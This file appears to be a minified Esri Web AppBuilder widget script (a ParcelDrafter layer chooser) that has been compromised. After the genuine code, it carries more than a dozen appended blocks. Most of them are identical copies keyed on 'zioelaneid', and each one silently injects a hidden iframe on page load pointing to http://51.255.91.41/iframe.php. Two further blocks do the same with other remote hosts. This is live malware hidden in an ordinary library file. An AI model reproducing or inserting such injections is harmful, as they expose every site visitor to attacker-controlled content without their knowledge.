// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ParcelDrafter/setting/LayerChooser.html":'\x3cdiv style\x3d"width: 100%; height: 100%;"\x3e\r\n    \x3cdiv class\x3d"esriCTLayerSelectorNode" data-dojo-attach-point\x3d"layerSelectorContainer"\x3e\r\n        \x3c!-- Single Layer Selector --\x3e\r\n        \x3cdiv style\x3d"width: 98%;"  data-dojo-attach-point\x3d"singleLayerChooser"\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Related Layer Selector --\x3e\r\n        \x3cdiv class\x3d"esriCTLayerSelectorDiv"  data-dojo-attach-point\x3d"relatedLayerChooser"\x3e\r\n            \x3cdiv class\x3d"esriCTLayerChooserContainer row"\x3e\r\n                \x3cdiv class\x3d"esriCTLayerChooserFieldLabel esriCTEllipsis" title\x3d"${nls.parcelPolygonLayer.selectPolygonLayerLabel}"\x3e\r\n                    ${nls.parcelPolygonLayer.selectPolygonLayerLabel}\r\n                \x3c/div\x3e\r\n                \x3cdiv class\x3d"esriCTLayerChooserField"\x3e\r\n                    \x3cdiv style\x3d"width: 98%;" data-dojo-attach-point\x3d"relatedLayerChooserDiv"\x3e\r\n                    \x3c/div\x3e\r\n                    \x3cdiv class\x3d"esriCTHint"\x3e\r\n                        ${nls.parcelPolygonLayer.selectPolygonLayerHintText}\r\n                    \x3c/div\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTLayerChooserContainer row"\x3e\r\n                \x3cdiv class\x3d"esriCTLayerChooserFieldLabel esriCTEllipsis" title\x3d"${nls.parcelLineLayer.selectLayerLabel}"\x3e\r\n                    ${nls.parcelLineLayer.selectLayerLabel}\r\n                \x3c/div\x3e\r\n                \x3cdiv class\x3d"esriCTLayerChooserField"\x3e\r\n                    \x3cselect style\x3d"width: 98%;" data-dojo-type\x3d"dijit/form/Select"  data-dojo-attach-point\x3d"relatedLayerSelector"\x3e\r\n                \x3c/select\x3e\r\n                    \x3cdiv class\x3d"esriCTHint"\x3e\r\n                        ${nls.parcelLineLayer.selectLayerHintText}\r\n                    \x3c/div\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/array dojo/_base/lang dojo/on dojo/text!./LayerChooser.html jimu/dijit/LayerChooserFromMap jimu/dijit/LayerChooserFromMapWithDropbox dojo/dom-class jimu/utils dojo/Deferred esri/request dojo/promise/all jimu/dijit/Message jimu/dijit/Popup dojo/dom-construct dojo/domReady!".split(" "),function(n,p,q,k,e,r,t,h,u,v,w,x,y,z,A,B,m){return n([p,q],{baseClass:"jimu-widget-ParcelDrafter-setting",templateString:t,selectedLayerDetails:[],
relatedLayerInfo:[],relatedLayerTypes:[],chooseRelatedLayers:!1,_layerChooserFromMap:null,startup:function(){this.inherited(arguments)},postCreate:function(){this.selectedLayerDetails=[];this.relatedLayerInfo=[];this.relatedLayerTypes&&0!==this.relatedLayerTypes.length||(this.relatedLayerTypes=["point","polyline","polygon"]);this._initPopup();this._initLayerSelector()},_initPopup:function(){this.okButton=m.create("button",{title:this.nls.common.ok});this.okButton.label=this.nls.common.ok;this.okButton.onClick=
e.hitch(this,function(){this.multiple&&this._getSelectedLayers();this.chooseRelatedLayers&&0<this.relatedLayerInfo.length&&this.selectedLayerDetails.push(this.relatedLayerInfo[this.relatedLayerSelector.value]);this.onOKButtonClicked(this.selectedLayerDetails);this.popup.close()});this.cancelButton=m.create("button",{title:this.nls.common.cancel});this.cancelButton.label=this.nls.common.cancel;this.cancelButton.onClick=e.hitch(this,function(a){this.onCancelClick(a);this.popup.close()});this.popup=
new B({titleLabel:this.title,content:this.domNode,width:830,autoHeight:!0,buttons:[this.okButton,this.cancelButton]});this.popup.disableButton(0)},_initLayerSelector:function(){var a;a={multiple:this.multiple,createMapResponse:this.map.webMapResponse,showLayerTypes:this.showLayerTypes,filter:this._createFiltersForLayerSelector()};this.multiple?this._layerChooserFromMap=new h(a):(a=new h(a),this._layerChooserFromMap=new u({layerChooser:a}));this.chooseRelatedLayers?this._layerChooserFromMap.placeAt(this.relatedLayerChooserDiv):
(v.add(this.relatedLayerChooser,"esriCTHidden"),this._layerChooserFromMap.placeAt(this.singleLayerChooser));this._layerChooserFromMap.startup();this.multiple?this._layerChooserFromMap._onTreeClick=e.hitch(this,function(){this._layerChooserFromMap.getSelectedItems().length?this.popup.enableButton(0):this.popup.disableButton(0)}):this.own(r(this._layerChooserFromMap,"selection-change",e.hitch(this,function(a){this._setSelectedLayerDetails(a)})))},_createFiltersForLayerSelector:function(){var a,b;a=
h.createFeaturelayerFilter(this.types?this.types:["point","polyline","polygon"],!1,!1);b=h.createImageServiceLayerFilter(!0);return h.orCombineFilters([a,b])},_setSelectedLayerDetails:function(a){var b;b={};this.selectedLayerDetails=[];b.id=a[0].id;b.url=a[0].url;b.geometryType=a[0].geometryType;b.layerId=a[0].layerId;b.baseURL=a[0].url.substr(0,a[0].url.lastIndexOf("/")+1);a[0].relationships&&(b.relationships=a[0].relationships);this.selectedLayerDetails.push(b);this.chooseRelatedLayers?this._createRelatedLayerOptions(this.selectedLayerDetails[0]):
this.popup.enableButton(0)},_getSelectedLayers:function(){var a,b,e,c;this.selectedLayerDetails=[];b=this._layerChooserFromMap.getSelectedItems();if(0<b.length)for(this.popup.enableButton(0),a=0;a<b.length;a++)c={url:b[a].layerInfo.layerObject.url,geometryType:b[a].layerInfo.layerObject.geometryType,id:b[a].layerInfo.layerObject.id},c.layerId=b[a].layerId?b[a].layerId:c.url.substr(c.url.lastIndexOf("/")+1,c.url.length),e=c.url.substr(0,c.url.lastIndexOf("/")+1),c.baseURL=e,this.selectedLayerDetails.push(c)},
_getLayerDetailsFromMap:function(a,b){var f=[],c;this.map&&this.map.webMapResponse&&this.map.webMapResponse.itemInfo&&this.map.webMapResponse.itemInfo.itemData&&this.map.webMapResponse.itemInfo.itemData.operationalLayers&&k.forEach(this.map.webMapResponse.itemInfo.itemData.operationalLayers,e.hitch(this,function(d){c={};d.layerObject&&("ArcGISMapServiceLayer"===d.layerType||"ArcGISTiledMapServiceLayer"===d.layerType?a.substring(0,a.length-1)===d.url&&(k.forEach(d.resourceInfo.layers,e.hitch(this,
function(a){a.id===parseInt(b,10)&&(c.title=a.name,f.push(c))})),k.forEach(d.layers,e.hitch(this,function(a){a.id===parseInt(b,10)&&(a.name&&(c.title=a.name),c.id=d.id,f.push(c))}))):d.url.replace(/.*?:\/\//g,"").toLowerCase()===(a+b).replace(/.*?:\/\//g,"").toLowerCase()&&(c.id=d.id,c.title=d.title,f.push(c)))}));return f},_createRelatedLayerOptions:function(a){var b=[],f;if(a&&a.relationships&&0<a.relationships.length){this.relatedLayerInfo=[];f=[];var c=a.baseURL;k.forEach(a.relationships,e.hitch(this,
function(a){var b=new x;f.push(b);y({url:c+a.relatedTableId,content:{f:"json"},handleAs:"json"}).then(e.hitch(this,function(a){b.resolve(a)}),e.hitch(this,function(){b.resolve()}))}));z(f).then(e.hitch(this,function(d){var f,h,g,k,l;for(g=0;g<d.length;g++)if(d[g]&&(f=w.getTypeByGeometryType(d[g].geometryType),-1<this.relatedLayerTypes.indexOf(f)))for(f={url:c+d[g].id,baseURL:c,relationShipId:a.relationships[g].id,layerId:d[g].id,geometryType:d[g].geometryType,title:d[g].name},d[g].fields&&(f.fields=
e.clone(d[g].fields)),l=this._getLayerDetailsFromMap(c,d[g].id),k=0;k<l.length;k++)h=e.clone(f),e.mixin(h,l[k]),h.title&&(this.relatedLayerInfo[b.length]=h,b.push({label:this.relatedLayerInfo[b.length].title,value:b.length}));0<b.length?(this.relatedLayerSelector.options.length=0,b[0].selected=!0,this.relatedLayerSelector.addOption(b),this.popup.enableButton(0)):this._resetRelatedLayerSelector()}),e.hitch(this,function(){this._resetRelatedLayerSelector()}))}else this._resetRelatedLayerSelector()},
_resetRelatedLayerSelector:function(){this.relatedLayerSelector.value="";this.relatedLayerSelector.options.length=0;this.relatedLayerSelector.addOption({value:"",label:"",selected:!0});this.popup.disableButton(0);this._showMessage(this.nls.layerSelector.selectedLayerNotHavingRelatedLayer)},onOKButtonClicked:function(){return this.selectedLayerDetails},onCancelClick:function(a){return a},_showMessage:function(a){(new A({message:a,buttons:[{label:this.nls.common.ok}]})).message=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});